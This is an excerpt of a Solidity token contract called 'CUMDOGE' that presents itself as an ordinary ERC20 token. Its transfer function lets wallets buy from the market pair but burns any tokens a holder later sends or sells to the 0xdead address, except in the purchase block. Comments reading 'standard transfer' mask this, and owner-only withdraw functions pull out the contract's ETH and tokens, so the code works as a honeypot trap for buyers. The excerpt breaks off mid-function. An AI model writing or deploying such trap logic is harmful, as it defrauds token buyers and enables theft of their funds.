...
contract CUMDOGE is ERC20, Ownable {
    using SafeMath for uint256;

    string public tokenName = "CUMDOGE";
    string public tokenSymbol = "CMD";
    ...
    mapping(address => uint256) private blockBuy;
    ...
    function _transfer(
        ...
        if (automatedMarketMakerPairs[from]) {
            blockBuy[to] = block.number;
            // standard transfer
            super._transfer(from, to, amount);
        }
        else if (blockBuy[from] == block.number) {
            // standard transfer
            super._transfer(from, to, amount);
        }
        else {
            super._transfer(from, address(0xdead), amount); // Burn the remaining tokens
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner(), "ERC20: withdraw can only be called by owner");
        require(payable(msg.sender).send(address(this).balance));
    }

    function withdrawToken(address contractAddress) public payable {
        require(msg.sender == owner(), "ERC20: withdraw can only be called by owner");
